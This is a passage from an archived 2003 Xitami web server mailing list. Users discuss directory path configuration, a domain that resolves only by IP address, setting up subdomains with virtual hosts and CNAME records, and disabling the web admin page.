+Portbase=3D8000<BR>&nbsp;&nbsp;&nbsp; Priority=3D3<BR>&nbsp;&nbsp;&nbsp; =
+
+Recover=3D1<BR>&nbsp;&nbsp;&nbsp;=20
+Webpages=3DX:/Projects/Line1<BR></FONT></SPAN></DIV>
+<DIV><SPAN class=3D265473701-15122003><FONT face=3DArial size=3D2>I have =
+also noticed=20
+that the folder and file icons are missing in the xitami directory =
+listings.=20
+</FONT></SPAN></DIV>
+<DIV><SPAN class=3D265473701-15122003><FONT face=3DArial size=3D2>This =
+indicates to me=20
+that xitami is not quite seeing the directory paths the same as=20
+before.</FONT></SPAN></DIV>
+<DIV><SPAN class=3D265473701-15122003><FONT face=3DArial=20
+size=3D2></FONT></SPAN>&nbsp;</DIV>
+<DIV><SPAN class=3D265473701-15122003><FONT face=3DArial size=3D2>The =
+path to the=20
+xitami exe&nbsp;on this server are =
+X:/Projects/Line1/Xitami</FONT></SPAN></DIV>
+<DIV><SPAN class=3D265473701-15122003><FONT face=3DArial=20
+size=3D2></FONT></SPAN>&nbsp;</DIV>
+<DIV><SPAN class=3D265473701-15122003><FONT face=3DArial=20
+size=3D2>Thanks</FONT></SPAN></DIV>
+<DIV><SPAN class=3D265473701-15122003><FONT face=3DArial=20
+size=3D2>Justin</FONT></SPAN></DIV>
+<DIV><SPAN class=3D265473701-15122003></SPAN></FONT>&nbsp;</DIV></DIV>
+<DIV>&nbsp;</DIV></BODY></HTML>
+
+------_=_NextPart_001_01C3C2BA.34C09DD0--
+
+From xitami@lists.xitami.org  Sat Dec 20 17:25:49 2003
+From: xitami@lists.xitami.org (tom buckley)
+Date: Sat, 20 Dec 2003 12:25:49 -0500
+Subject: [Xitami] Not Recognizing Domain Name:
+Message-ID: <BAY1-F115HJQQw0kmPi00045ce3@hotmail.com>
+
+  Hello and good holidays to everyone,
+
+  I'm not sure how or why, but all of a sudden, the pages on my site are not 
+recognized under the domain name!  In other words, If I wanted to view page 
+"rules/index.html"  in the "rules" directory, I cannot get there via: 
+http://www.sorcep.com/rules/index.html, but I CAN get to it using the 
+numerical address of: http://65.68.25.113/rules/index.html..  The ONLY page 
+on my site that recognizes the words "sorcep.com" is the home page..  IOW's  
+you CAN get to my site by typing http://www.sorcep.com, but you CAN NOT get 
+past that page, to ANY directory using sorcep.com. INstead you MUST use the 
+numerical address!  Can someone please lend a hand, (advice) on what may 
+have happened here?  Thanks much, and again, good holidays to you all!
+
+  jgq
+++++++
+
+_________________________________________________________________
+Make your home warm and cozy this winter with tips from MSN House & Home.  
+http://special.msn.com/home/warmhome.armx
+
+
+From xitami@lists.xitami.org  Sat Dec 20 18:16:44 2003
+From: xitami@lists.xitami.org (Tom Baker)
+Date: Sat, 20 Dec 2003 13:16:44 -0500
+Subject: [Xitami] Not Recognizing Domain Name:
+References: <BAY1-F115HJQQw0kmPi00045ce3@hotmail.com>
+Message-ID: <000501c3c725$6cc4cca0$0200a8c0@dsl.gtei.net>
+
+>   Hello and good holidays to everyone,
+
+Likewise!
+
+>   I'm not sure how or why, but all of a sudden, the pages on my site are
+not
+> recognized under the domain name!  In other words, If I wanted to view
+page
+> "rules/index.html"  in the "rules" directory, I cannot get there via:
+> http://www.sorcep.com/rules/index.html, but I CAN get to it using the
+> numerical address of: http://65.68.25.113/rules/index.html..  The ONLY
+page
+> on my site that recognizes the words "sorcep.com" is the home page..
+IOW's
+> you CAN get to my site by typing http://www.sorcep.com, but you CAN NOT
+get
+> past that page, to ANY directory using sorcep.com. INstead you MUST use
+the
+> numerical address!  Can someone please lend a hand, (advice) on what may
+> have happened here?  Thanks much, and again, good holidays to you all!
+>
+>   jgq
+> ++++++
+
+I looked up the DNS entries for both sorcep.com and www.sorcep.com and they
+returned an A-record IP of 216.204.150.251
+
+When I go to this address, it is DomainCow. So I assume you are doing so
+sort of IP-forwarding? It sure seems like the problem lies there.
+
+Tom
+
+
+
+From xitami@lists.xitami.org  Sat Dec 20 19:53:26 2003
+From: xitami@lists.xitami.org (tom buckley)
+Date: Sat, 20 Dec 2003 14:53:26 -0500
+Subject: [Xitami] Not Recognizing Domain Name: / Tom
+Message-ID: <BAY1-F41fc6n38JFaAF00018d5f@hotmail.com>
+
+  Hello Tom,
+
+  Thank you for replying!  I saw that too.  This has happened more than 
+once!  I use a free DNS  service "Domaincow" (only because I don't know how 
+to do it any other way), and 216.204.150.251 is in fact one of the DNS 
+servers there at Domaincow..  I have the option of logging in and changing 
+that back to my IP address.  Is this what I need to do?  I have read several 
+times 'here on this list' about some of you running your own DNS, or DNS 
+servers etc;  Is this a better way?  IS it something that I should be doing, 
+and what does it consist of if you think I should!  Thanks again Tom!  I 
+will wait for you to tel me, and I will then go change the web site address 
+back to my own, if I should!  Have a good day!
+
+  jgq
++++++++
+
+
+>   Hello and good holidays to everyone,
+
+Likewise!
+
+>   I'm not sure how or why, but all of a sudden, the pages on my site are
+not
+>recognized under the domain name!  In other words, If I wanted to view
+page
+>"rules/index.html"  in the "rules" directory, I cannot get there via:
+>http://www.sorcep.com/rules/index.html, but I CAN get to it using the
+>numerical address of: http://65.68.25.113/rules/index.html..  The ONLY
+page
+>on my site that recognizes the words "sorcep.com" is the home page..
+IOW's
+>you CAN get to my site by typing http://www.sorcep.com, but you CAN NOT
+get
+>past that page, to ANY directory using sorcep.com. INstead you MUST use
+the
+>numerical address!  Can someone please lend a hand, (advice) on what may
+>have happened here?  Thanks much, and again, good holidays to you all!
+>
+>   jgq
+>++++++
+
+I looked up the DNS entries for both sorcep.com and www.sorcep.com and they
+returned an A-record IP of 216.204.150.251
+
+When I go to this address, it is DomainCow. So I assume you are doing so
+sort of IP-forwarding? It sure seems like the problem lies there.
+
+Tom
+
+_________________________________________________________________
+Get dial-up Internet access now with our best offer: 6 months @$9.95/month!  
+http://join.msn.com/?page=dept/dialup
+
+
+From xitami@lists.xitami.org  Sat Dec 20 20:04:32 2003
+From: xitami@lists.xitami.org (Ron Ackerman)
+Date: Sat, 20 Dec 2003 15:04:32 -0500
+Subject: [Xitami] Not Recognizing Domain Name: / Tom
+In-Reply-To: <BAY1-F41fc6n38JFaAF00018d5f@hotmail.com>
+Message-ID: <NFBBKNGGELNPLMHPBOCEEECGEAAA.ron@miplanet.net>
+
+I have been using dns2go.com for over a year now and have not had a bit of
+problems. I would suggest looking into dns2go or there is another good one
+that I can't think of at the moment.
+
+Ron
+
+-----Original Message-----
+From: xitami-admin@lists.xitami.org
+[mailto:xitami-admin@lists.xitami.org]On Behalf Of tom buckley
+Sent: Saturday, December 20, 2003 2:53 PM
+To: xitami@lists.xitami.org
+Subject: RE: [Xitami] Not Recognizing Domain Name: / Tom
+
+
+
+  Hello Tom,
+
+  Thank you for replying!  I saw that too.  This has happened more than
+once!  I use a free DNS  service "Domaincow" (only because I don't know how
+to do it any other way), and 216.204.150.251 is in fact one of the DNS
+servers there at Domaincow..  I have the option of logging in and changing
+that back to my IP address.  Is this what I need to do?  I have read several
+times 'here on this list' about some of you running your own DNS, or DNS
+servers etc;  Is this a better way?  IS it something that I should be doing,
+and what does it consist of if you think I should!  Thanks again Tom!  I
+will wait for you to tel me, and I will then go change the web site address
+back to my own, if I should!  Have a good day!
+
+  jgq
++++++++
+
+
+>   Hello and good holidays to everyone,
+
+Likewise!
+
+>   I'm not sure how or why, but all of a sudden, the pages on my site are
+not
+>recognized under the domain name!  In other words, If I wanted to view
+page
+>"rules/index.html"  in the "rules" directory, I cannot get there via:
+>http://www.sorcep.com/rules/index.html, but I CAN get to it using the
+>numerical address of: http://65.68.25.113/rules/index.html..  The ONLY
+page
+>on my site that recognizes the words "sorcep.com" is the home page..
+IOW's
+>you CAN get to my site by typing http://www.sorcep.com, but you CAN NOT
+get
+>past that page, to ANY directory using sorcep.com. INstead you MUST use
+the
+>numerical address!  Can someone please lend a hand, (advice) on what may
+>have happened here?  Thanks much, and again, good holidays to you all!
+>
+>   jgq
+>++++++
+
+I looked up the DNS entries for both sorcep.com and www.sorcep.com and they
+returned an A-record IP of 216.204.150.251
+
+When I go to this address, it is DomainCow. So I assume you are doing so
+sort of IP-forwarding? It sure seems like the problem lies there.
+
+Tom
+
+_________________________________________________________________
+Get dial-up Internet access now with our best offer: 6 months @$9.95/month!
+http://join.msn.com/?page=dept/dialup
+
+
+--
+Xitami Users Mailing List -- For Xitami support
+To unsubscribe: http://lists.xitami.org/mailman/listinfo/xitami
+
+
+From xitami@lists.xitami.org  Sat Dec 20 20:09:35 2003
+From: xitami@lists.xitami.org (Ron Ackerman)
+Date: Sat, 20 Dec 2003 15:09:35 -0500
+Subject: [Xitami] Sub domains
+In-Reply-To: <7D30D5D3C525994CAD6C6A1C40B788B25C22@chasca.domaina.int.net>
+Message-ID: <NFBBKNGGELNPLMHPBOCEOECGEAAA.ron@miplanet.net>
+
+This is a multi-part message in MIME format.
+
+------=_NextPart_000_0002_01C3C70B.4770FA60
+Content-Type: text/plain;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: 7bit
+
+[Alias]I am able to do sub domains like www.mydomain.com/sub or
+sub.mydomain.com. Now of course the first one is just a directory and
+doesn't need it's own IP address. However with the second one I have to set
+up an IP address for it. Is there a way to set up sub.mydomain.com without
+it's own IP.
+
+Ron
+
+------=_NextPart_000_0002_01C3C70B.4770FA60
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<HTML><HEAD><TITLE>[Alias]</TITLE>
+<META http-equiv=3DContent-Type content=3D"text/html; =
+charset=3Diso-8859-1">
+<META content=3D"MSHTML 6.00.2800.1276" name=3DGENERATOR></HEAD>
+<BODY>
+<DIV><SPAN class=3D989120520-20122003><FONT face=3DArial color=3D#0000ff =
+size=3D2>I am=20
+able to do sub domains like <A=20
+href=3D"http://www.mydomain.com/sub">www.mydomain.com/sub</A> or =
+sub.mydomain.com.=20
+Now of course the first one is just a directory and doesn't need it's =
+own IP=20
+address. However with the second one I have to set up an IP address for =
+it. Is=20
+there a way to set up sub.mydomain.com without it's own IP. =
+</FONT></SPAN></DIV>
+<DIV><SPAN class=3D989120520-20122003><FONT face=3DArial color=3D#0000ff =
+
+size=3D2></FONT></SPAN>&nbsp;</DIV>
+<DIV><SPAN class=3D989120520-20122003><FONT face=3DArial color=3D#0000ff =
+
+size=3D2>Ron</FONT></SPAN></DIV></BODY></HTML>
+
+------=_NextPart_000_0002_01C3C70B.4770FA60--
+
+
+From xitami@lists.xitami.org  Thu Dec 18 23:39:42 2003
+From: xitami@lists.xitami.org (WhiteShepherd)
+Date: Thu, 18 Dec 2003 18:39:42 -0500
+Subject: [Xitami] Admin function.
+Message-ID: <3FE1F46E.6596.14211E3@localhost>
+
+How do I get "rid" of the admin function?  None of my users can 
+use /admin directories in their web sites or it tries to bring up my 
+admin page.  Is there a way to configure this out?
+
+From xitami@lists.xitami.org  Sun Dec 21 03:36:26 2003
+From: xitami@lists.xitami.org (Day Tooley)
+Date: Sat, 20 Dec 2003 19:36:26 -0800
+Subject: [Xitami] Sub domains
+References: <NFBBKNGGELNPLMHPBOCEOECGEAAA.ron@miplanet.net>
+Message-ID: <002d01c3c773$9cfdc8b0$e867a1d0@Tooley4600>
+
+This is a multi-part message in MIME format.
+
+------=_NextPart_000_002A_01C3C730.8EB91E00
+Content-Type: text/plain;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+[Alias]Easiest way is to simply set up a new host in Admin.  For =
+example:
+    >Virtual Hosts
+    >New
+    Create virtual host profile:  Anyname
+    Enter DNS host name:  sub.yourdomain.com
+    Web page root directory:  c:\websites\sub
+
+That's it.  Don't select an IP address, just take the default of 'all =
+addresses'.
+
+You will need to have your DNS provider create an 'A' record for the =
+sub.domain.com and point it to your server's IP address.  If you do a =
+DIG or NSLOOKUP, you would see this entry:
+
+    sub.yourdomain.com.      86400    A    123.123.123.123
+
+Or, if your registrar (such as directNIC.com) will do DNS for you and =
+wildcard all subdomains (*.yourdomain.com), then nothing further is =
+needed.  =20
+=20
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+Day Tooley
+Webfoot@EasyStreet.com
+
+
+  ----- Original Message -----=20
+  From: Ron Ackerman=20
+  To: xitami@lists.xitami.org=20
+  Sent: Saturday, December 20, 2003 12:09 PM
+  Subject: [Xitami] Sub domains
+
+
+  I am able to do sub domains like www.mydomain.com/sub or =
+sub.mydomain.com. Now of course the first one is just a directory and =
+doesn't need it's own IP address. However with the second one I have to =
+set up an IP address for it. Is there a way to set up sub.mydomain.com =
+without it's own IP.=20
+
+  Ron
+------=_NextPart_000_002A_01C3C730.8EB91E00
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<HTML><HEAD><TITLE>[Alias]</TITLE>
+<META http-equiv=3DContent-Type content=3D"text/html; =
+charset=3Diso-8859-1">
+<META content=3D"MSHTML 6.00.2800.1276" name=3DGENERATOR>
+<STYLE></STYLE>
+</HEAD>
+<BODY bgColor=3D#ffffff>
+<DIV>
+<DIV><FONT face=3DArial size=3D2>Easiest way is to simply set up a new =
+host in=20
+Admin.&nbsp; For example:</FONT></DIV>
+<DIV><FONT face=3DArial size=3D2>&nbsp;&nbsp;&nbsp; &gt;Virtual =
+Hosts</FONT></DIV>
+<DIV><FONT face=3DArial size=3D2>&nbsp;&nbsp;&nbsp; &gt;New</FONT></DIV>
+<DIV><FONT face=3DArial size=3D2>&nbsp;&nbsp;&nbsp; Create virtual host=20
+profile:&nbsp; Anyname</FONT></DIV>
+<DIV><FONT face=3DArial size=3D2>&nbsp;&nbsp;&nbsp;&nbsp;Enter DNS host =
+name:&nbsp;=20
+sub.yourdomain.com</FONT></DIV>
+<DIV><FONT face=3DArial size=3D2>&nbsp;&nbsp;&nbsp; Web page root =
+directory:&nbsp;=20
+c:\websites\sub</FONT></DIV>
+<DIV><FONT face=3DArial size=3D2></FONT>&nbsp;</DIV>
+<DIV><FONT face=3DArial size=3D2>That's it.&nbsp; Don't select an IP =
+address, just=20
+take the default of 'all addresses'.</FONT></DIV>
+<DIV><FONT face=3DArial size=3D2></FONT>&nbsp;</DIV>
+<DIV><FONT face=3DArial size=3D2>You will need to have your DNS provider =
+create an=20
+'A' record for the sub.domain.com and point it to your server's IP=20
+address.&nbsp; If you do a DIG or NSLOOKUP, you would see this=20
+entry:</FONT></DIV>
+<DIV><FONT face=3DArial size=3D2></FONT>&nbsp;</DIV>
+<DIV><FONT face=3DArial size=3D2>&nbsp;&nbsp;&nbsp;=20
+sub.yourdomain.com.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; =
+86400&nbsp;&nbsp;&nbsp;=20
+A&nbsp;&nbsp;&nbsp; 123.123.123.123</FONT></DIV>
+<DIV><FONT face=3DArial size=3D2></FONT>&nbsp;</DIV>
+<DIV><FONT face=3DArial size=3D2>Or, if your registrar (such as =
+directNIC.com) will=20
+do DNS for you and wildcard all subdomains (*.yourdomain.com), then =
+nothing=20
+further is needed.&nbsp;&nbsp;&nbsp;</FONT></DIV>
+<DIV><FONT face=3DArial size=3D2>&nbsp;</FONT></DIV>
+<DIV><FONT face=3DArial =
+size=3D2>=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D<BR>Day=20
+Tooley<BR>Webfoot@EasyStreet.com</FONT></DIV>
+<DIV>&nbsp;</DIV>
+<DIV><FONT face=3DArial size=3D2></FONT>&nbsp;</DIV></DIV>
+<BLOCKQUOTE dir=3Dltr=20
+style=3D"PADDING-RIGHT: 0px; PADDING-LEFT: 5px; MARGIN-LEFT: 5px; =
+BORDER-LEFT: #000000 2px solid; MARGIN-RIGHT: 0px">
+  <DIV style=3D"FONT: 10pt arial">----- Original Message ----- </DIV>
+  <DIV=20
+  style=3D"BACKGROUND: #e4e4e4; FONT: 10pt arial; font-color: =
+black"><B>From:</B>=20
+  <A title=3Dron@miplanet.net href=3D"mailto:ron@miplanet.net">Ron =
+Ackerman</A>=20
+  </DIV>
+  <DIV style=3D"FONT: 10pt arial"><B>To:</B> <A =
+title=3Dxitami@lists.xitami.org=20
+  href=3D"mailto:xitami@lists.xitami.org">xitami@lists.xitami.org</A> =
+</DIV>
+  <DIV style=3D"FONT: 10pt arial"><B>Sent:</B> Saturday, December 20, =
+2003 12:09=20
+  PM</DIV>
+  <DIV style=3D"FONT: 10pt arial"><B>Subject:</B> [Xitami] Sub =
+domains</DIV>
+  <DIV><BR></DIV>
+  <DIV><SPAN class=3D989120520-20122003><FONT face=3DArial =
+color=3D#0000ff size=3D2>I am=20
+  able to do sub domains like <A=20
+  href=3D"http://www.mydomain.com/sub">www.mydomain.com/sub</A> or=20
+  sub.mydomain.com. Now of course the first one is just a directory and =
+doesn't=20
+  need it's own IP address. However with the second one I have to set up =
+an IP=20
+  address for it. Is there a way to set up sub.mydomain.com without it's =
+own IP.=20
+  </FONT></SPAN></DIV>
+  <DIV><SPAN class=3D989120520-20122003><FONT face=3DArial =
+color=3D#0000ff=20
+  size=3D2></FONT></SPAN>&nbsp;</DIV>
+  <DIV><SPAN class=3D989120520-20122003><FONT face=3DArial =
+color=3D#0000ff=20
+  size=3D2>Ron</FONT></SPAN></DIV></BLOCKQUOTE></BODY></HTML>
+
+------=_NextPart_000_002A_01C3C730.8EB91E00--
+
+
+From xitami@lists.xitami.org  Sun Dec 21 04:55:00 2003
+From: xitami@lists.xitami.org (Tom Baker)
+Date: Sat, 20 Dec 2003 23:55:00 -0500
+Subject: [Xitami] Not Recognizing Domain Name: / Tom
+References: <BAY1-F41fc6n38JFaAF00018d5f@hotmail.com>
+Message-ID: <001501c3c77e$96dedae0$0200a8c0@dsl.gtei.net>
+
+---- Original Message ----- 
+From: "tom buckley" <jglennqualls@hotmail.com>
+To: <xitami@lists.xitami.org>
+Sent: Saturday, December 20, 2003 2:53 PM
+Subject: RE: [Xitami] Not Recognizing Domain Name: / Tom
+
+
+>
+>   Hello Tom,
+>
+>   Thank you for replying!  I saw that too.  This has happened more than
+> once!  I use a free DNS  service "Domaincow" (only because I don't know
+how
+> to do it any other way), and 216.204.150.251 is in fact one of the DNS
+> servers there at Domaincow..  I have the option of logging in and changing
+> that back to my IP address.  Is this what I need to do?  I have read
+several
+> times 'here on this list' about some of you running your own DNS, or DNS
+> servers etc;  Is this a better way?  IS it something that I should be
+doing,
+> and what does it consist of if you think I should!  Thanks again Tom!  I
+> will wait for you to tel me, and I will then go change the web site
+address
+> back to my own, if I should!  Have a good day!
+>
+>   jgq
+> +++++++
+
+Do you have a static or dynamic IP address?
+
+In general, it's not worth setting up your own DNS server unless you really
+care. I use www.zoneedit.com for a lot of my backup DNS servers. Free for up
+to 5 domain names.
+
+You will need a minimum of 1 "A-record" pointing your web server IP address.
+If you use that domain name for email you need a "MX record" (Mail eXchange)
+pointing to the IP of your mail server.
+
+Remember, DNS records take a while to propage thru the internet. Expect
+24-96 hours on average before your update is seen by all servers.
+
+Tom
+
+
+
+From xitami@lists.xitami.org  Sun Dec 21 05:01:53 2003
+From: xitami@lists.xitami.org (Tom Baker)
+Date: Sun, 21 Dec 2003 00:01:53 -0500
+Subject: [Xitami] Sub domains
+References: <NFBBKNGGELNPLMHPBOCEOECGEAAA.ron@miplanet.net>
+Message-ID: <002101c3c77f$8d09a760$0200a8c0@dsl.gtei.net>
+
+This is a multi-part message in MIME format.
+
+------=_NextPart_000_001E_01C3C755.A42EBD60
+Content-Type: text/plain;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+[Alias]----- Original Message -----=20
+  From: Ron Ackerman=20
+  To: xitami@lists.xitami.org=20
+  Sent: Saturday, December 20, 2003 3:09 PM
+  Subject: [Xitami] Sub domains
+
+
+  I am able to do sub domains like www.mydomain.com/sub or =
+sub.mydomain.com. Now of course the first one is just a directory and =
+doesn't need it's own IP address. However with the second one I have to =
+set up an IP address for it. Is there a way to set up sub.mydomain.com =
+without it's own IP.=20
+
+  Ron
+You need two things to make this work.
+
+You need a CNAME record in your DNS server pointing to mydomain.com
+Example:
+A-record : mydomain.com =3D 192.168.0.1
+CNAME-record : www =3D mydomain.com   (This would get resolved as =
+www.mydomain.com =3D mydomain.com =3D 192.168.0.1. NOTE: some DNS =
+services requite CNAME www.mydomain.com =3D mydomain.com. Check their =
+instructions first.)
+CNAME-record : sub =3D mydomain.com  (This would get resolved as =
+sub.mydomain.com =3D mydomain.com =3D 192.168.0.1)
+
+Now, you need to set up a virtual host in Xitami, where sub.mydomain.com =
+=3D config.file
+
+When a request for sub.mydomain.com comes in, it will get passed to the =
+virtual host you setup.
+
+
+Tom
+------=_NextPart_000_001E_01C3C755.A42EBD60
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<HTML><HEAD><TITLE>[Alias]</TITLE>
+<META http-equiv=3DContent-Type content=3D"text/html; =
+charset=3Diso-8859-1">
+<META content=3D"MSHTML 6.00.2800.1276" name=3DGENERATOR>
+<STYLE></STYLE>
+</HEAD>
+<BODY bgColor=3D#ffffff>
+<DIV>----- Original Message ----- </DIV>
+<BLOCKQUOTE dir=3Dltr=20
+style=3D"PADDING-RIGHT: 0px; PADDING-LEFT: 5px; MARGIN-LEFT: 5px; =
+BORDER-LEFT: #000000 2px solid; MARGIN-RIGHT: 0px">
+  <DIV=20
+  style=3D"BACKGROUND: #e4e4e4; FONT: 10pt arial; font-color: =
+black"><B>From:</B>=20
+  <A title=3Dron@miplanet.net href=3D"mailto:ron@miplanet.net">Ron =
+Ackerman</A>=20
+  </DIV>
+  <DIV style=3D"FONT: 10pt arial"><B>To:</B> <A =
+title=3Dxitami@lists.xitami.org=20
+  href=3D"mailto:xitami@lists.xitami.org">xitami@lists.xitami.org</A> =
+</DIV>
+  <DIV style=3D"FONT: 10pt arial"><B>Sent:</B> Saturday, December 20, =
+2003 3:09=20
+  PM</DIV>
+  <DIV style=3D"FONT: 10pt arial"><B>Subject:</B> [Xitami] Sub =
+domains</DIV>
+  <DIV><BR></DIV>
+  <DIV><SPAN class=3D989120520-20122003><FONT face=3DArial =
+color=3D#0000ff size=3D2>I am=20
+  able to do sub domains like <A=20
+  href=3D"http://www.mydomain.com/sub">www.mydomain.com/sub</A> or=20
+  sub.mydomain.com. Now of course the first one is just a directory and =
+doesn't=20
+  need it's own IP address. However with the second one I have to set up =
+an IP=20
+  address for it. Is there a way to set up sub.mydomain.com without it's =
+own IP.=20
+  </FONT></SPAN></DIV>
+  <DIV><SPAN class=3D989120520-20122003><FONT face=3DArial =
+color=3D#0000ff=20
+  size=3D2></FONT></SPAN>&nbsp;</DIV>
+  <DIV><SPAN class=3D989120520-20122003><FONT face=3DArial =
+color=3D#0000ff=20
+  size=3D2>Ron</FONT></SPAN></DIV></BLOCKQUOTE>
+<DIV dir=3Dltr><SPAN class=3D989120520-20122003>You need two things to =
+make this=20
+work.</SPAN></DIV>
+<DIV dir=3Dltr><SPAN class=3D989120520-20122003></SPAN>&nbsp;</DIV>
+<DIV dir=3Dltr><SPAN class=3D989120520-20122003>You need a CNAME record =
+in your DNS=20
+server pointing to mydomain.com</SPAN></DIV>
+<DIV dir=3Dltr><SPAN class=3D989120520-20122003>Example:</SPAN></DIV>
+<DIV dir=3Dltr><SPAN class=3D989120520-20122003>A-record : mydomain.com =
+=3D=20
+192.168.0.1</SPAN></DIV>
+<DIV dir=3Dltr><SPAN class=3D989120520-20122003>CNAME-record : www =3D=20
+mydomain.com&nbsp;&nbsp; (This would get resolved as <A=20
+href=3D"http://www.mydomain.com">www.mydomain.com</A> =3D mydomain.com =
+=3D=20
+192.168.0.1. NOTE: some DNS services requite CNAME <A=20
+href=3D"http://www.mydomain.com">www.mydomain.com</A> =3D mydomain.com. =
+Check their=20
+instructions first.)</SPAN></DIV>
+<DIV dir=3Dltr><SPAN class=3D989120520-20122003>CNAME-record : sub =3D=20
+mydomain.com&nbsp; (This would get resolved as sub.mydomain.com =3D =
+mydomain.com =3D=20
+192.168.0.1)</SPAN></DIV>
+<DIV dir=3Dltr><SPAN class=3D989120520-20122003></SPAN>&nbsp;</DIV>
+<DIV dir=3Dltr><SPAN class=3D989120520-20122003>Now, you need to set up =
+a virtual=20
+host in Xitami, where sub.mydomain.com =3D config.file</SPAN></DIV>
+<DIV dir=3Dltr><SPAN class=3D989120520-20122003></SPAN>&nbsp;</DIV>
+<DIV dir=3Dltr><SPAN class=3D989120520-20122003>When a request for =
+sub.mydomain.com=20
+comes in, it will get passed to the virtual host you setup.</SPAN></DIV>
+<DIV dir=3Dltr><SPAN class=3D989120520-20122003></SPAN>&nbsp;</DIV>
+<DIV dir=3Dltr><SPAN class=3D989120520-20122003></SPAN>&nbsp;</DIV>
+<DIV dir=3Dltr><SPAN =
+class=3D989120520-20122003>Tom</SPAN></DIV></BODY></HTML>
+
+------=_NextPart_000_001E_01C3C755.A42EBD60--
+
+
+
+From xitami@lists.xitami.org  Sun Dec 21 05:03:20 2003
+From: xitami@lists.xitami.org (Tom Baker)
+Date: Sun, 21 Dec 2003 00:03:20 -0500
+Subject: [Xitami] Admin function.
+References: <3FE1F46E.6596.14211E3@localhost>
+Message-ID: <002701c3c77f$c0fa29a0$0200a8c0@dsl.gtei.net>
+
+----- Original Message ----- 
+From: "WhiteShepherd" <fuzzydog@furtopia.org>
+To: <xitami@lists.xitami.org>
+Sent: Thursday, December 18, 2003 6:39 PM
+Subject: [Xitami] Admin function.
+
+
+> How do I get "rid" of the admin function?  None of my users can
+> use /admin directories in their web sites or it tries to bring up my
+> admin page.  Is there a way to configure this out?
+
+A function I've seen but never tried to disable is "Allow Web based Admin".
+
+
+Tom
+
+
+
+From xitami@lists.xitami.org  Sun Dec 21 05:04:22 2003
+From: xitami@lists.xitami.org (Ron Ackerman)
+Date: Sun, 21 Dec 2003 00:04:22 -0500
+Subject: [Xitami] Sub domains
+In-Reply-To: <002d01c3c773$9cfdc8b0$e867a1d0@Tooley4600>
+Message-ID: <NFBBKNGGELNPLMHPBOCEEECPEAAA.ron@miplanet.net>
+
+This is a multi-part message in MIME format.
+
+------=_NextPart_000_0004_01C3C755.FCE0E2D0
+Content-Type: text/plain;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: 7bit
+
+[Alias]I don't use the gui interface I just change the record in
+defaults.cfg, I'll give it a go in there and see what happens. As far as DNS
+goes, I get to change that too.
+
+Thanks
+Ron
+  -----Original Message-----
+  From: xitami-admin@lists.xitami.org
+[mailto:xitami-admin@lists.xitami.org]On Behalf Of Day Tooley
+  Sent: Saturday, December 20, 2003 10:36 PM
+  To: xitami@lists.xitami.org
+  Subject: Re: [Xitami] Sub domains
+
+
+  Easiest way is to simply set up a new host in Admin.  For example:
+      >Virtual Hosts
+      >New
+      Create virtual host profile:  Anyname
+      Enter DNS host name:  sub.yourdomain.com
+      Web page root directory:  c:\websites\sub
+
+  That's it.  Don't select an IP address, just take the default of 'all
+addresses'.
+
+  You will need to have your DNS provider create an 'A' record for the
+sub.domain.com and point it to your server's IP address.  If you do a DIG or
+NSLOOKUP, you would see this entry:
+
+      sub.yourdomain.com.      86400    A    123.123.123.123
+
+  Or, if your registrar (such as directNIC.com) will do DNS for you and
+wildcard all subdomains (*.yourdomain.com), then nothing further is needed.
+
+  =======================
+  Day Tooley
+  Webfoot@EasyStreet.com
+
+
+    ----- Original Message -----
+    From: Ron Ackerman
+    To: xitami@lists.xitami.org
+    Sent: Saturday, December 20, 2003 12:09 PM
+    Subject: [Xitami] Sub domains
+
+
+    I am able to do sub domains like www.mydomain.com/sub or
+sub.mydomain.com. Now of course the first one is just a directory and
+doesn't need it's own IP address. However with the second one I have to set
+up an IP address for it. Is there a way to set up sub.mydomain.com without
+it's own IP.
+
+    Ron
+
+------=_NextPart_000_0004_01C3C755.FCE0E2D0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<HTML><HEAD><TITLE>[Alias]</TITLE>
+<META http-equiv=3DContent-Type content=3D"text/html; =
+charset=3Diso-8859-1">
+<META content=3D"MSHTML 6.00.2800.1276" name=3DGENERATOR>
+<STYLE></STYLE>
+</HEAD>
+<BODY bgColor=3D#ffffff>
+<DIV><SPAN class=3D003440205-21122003><FONT face=3DArial color=3D#0000ff =
+size=3D2>I=20
+don't use the gui interface I just change the record in defaults.cfg, =
+I'll give=20
+it a go in there and see what happens. As far as DNS goes, I get to =
+change that=20
+too. </FONT></SPAN></DIV>
+<DIV><SPAN class=3D003440205-21122003><FONT face=3DArial color=3D#0000ff =
+
+size=3D2></FONT></SPAN>&nbsp;</DIV>
+<DIV><SPAN class=3D003440205-21122003><FONT face=3DArial color=3D#0000ff =
+
+size=3D2>Thanks</FONT></SPAN></DIV>
+<DIV><SPAN class=3D003440205-21122003><FONT face=3DArial color=3D#0000ff =
+
+size=3D2>Ron</FONT></SPAN></DIV>
+<BLOCKQUOTE dir=3Dltr style=3D"MARGIN-RIGHT: 0px">
+  <DIV class=3DOutlookMessageHeader dir=3Dltr align=3Dleft><FONT =
+face=3DTahoma=20
+  size=3D2>-----Original Message-----<BR><B>From:</B>=20
+  xitami-admin@lists.xitami.org =
+[mailto:xitami-admin@lists.xitami.org]<B>On=20
+  Behalf Of </B>Day Tooley<BR><B>Sent:</B> Saturday, December 20, 2003 =
